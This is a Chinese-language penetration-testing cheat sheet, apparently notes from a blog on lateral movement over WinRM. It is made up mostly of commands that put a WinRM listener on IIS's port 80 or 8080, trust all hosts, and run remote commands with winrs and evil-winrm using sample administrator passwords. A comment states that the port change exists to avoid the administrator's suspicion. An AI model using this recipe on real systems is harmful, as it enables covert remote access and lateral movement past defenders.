[Link](https://www.se7ensec.cn/2020/08/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8Ewinrm%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/)


Windows 

IIS可以和WinRM进行端口复用
```sh
# Server 端口复用 HTTP.sys https://www.cnblogs.com/0x4D75/p/11381449.html
## 使用 netsh http show servicestate 命令可以查看所有在HTTP.sys上注册过的url前缀。
## Windows Server 2012及以上，已经默认开启WinRM并监听了5985端口
## Windows Server 2008及一下，使用 winrm quickconfig -q 命令开启WinRM并自动从防火墙放行5985端口。

## 查询当前注册url前缀：
netsh http show servicestate
winrm quickconfig -q
##  增加80端口复用
winrm set winrm/config/service @{EnableCompatibilityHttpListener="true"}
winrm set winrm/config/service @{EnableCompatibilityHttpListener="true"; Port="8080"}
## 更改winrm为80端口
winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port="80"}

### 使用8080端口监听连接
### winrm set winrm/config/listener?Address=*+Transport=HTTP @{Port="8080"}

### 修改5985为80 winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port="80"}

# 查看 有5985, 也有80监听
winrm e winrm/config/Listener
# 执行下面 要看到 HTTP://+:80/WSMAN/
netsh http show servicestate

## 修改WinRM端口: 对于原本未开放WinRM服务的机器（Server 2008），需要把新开的5985端口修改至80端口，避免引起系统管理员怀疑。
## winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port="80"}


# Client
winrm quickconfig -q
## 设置信任连接的主机
winrm set winrm/config/Client @{TrustedHosts="*"}

winrs -r:192.168.127.140 -u:administrator -p:1qaz@WSX whoami
winrs -r:192.168.127.140 -u:administrator -p:1qaz@WSX cmd
evil-winrm  -i 192.168.127.140 -u Administrator -p '1qaz@WSX'
evil-winrm  -i 192.168.127.140 -u Administrator -p '1qaz@WSX' -P 8080


# 其他命令
winrm delete winrm/config/Listener?Address=*+Transport=HTTP
winrm delete winrm/config/Listener?Address=*+Transport=HTTP+Source=Compatibility
winrm set winrm/config/service @{EnableCompatibilityHttpListener="false"}
winrm set winrm/config/service @{EnableCompatibilityHttpsListener="true"}
```

winrs -r:http://www.baidu.com -u:administrator -p:P@ssw0rd whoami



# client检测
```
Get-WmiObject -Class win32_service | Where-Object {$_.name -like "WinRM"}   
Start-Service WinRM

Enter-PSSession -ComputerName 192.168.127.140 -Credential Administrator
winrm set winrm/config/Client @{TrustedHosts="*"}

winrs -r:192.168.127.140 -u:192.168.127.140\administrator -p:1qaz@WSX whoami
```
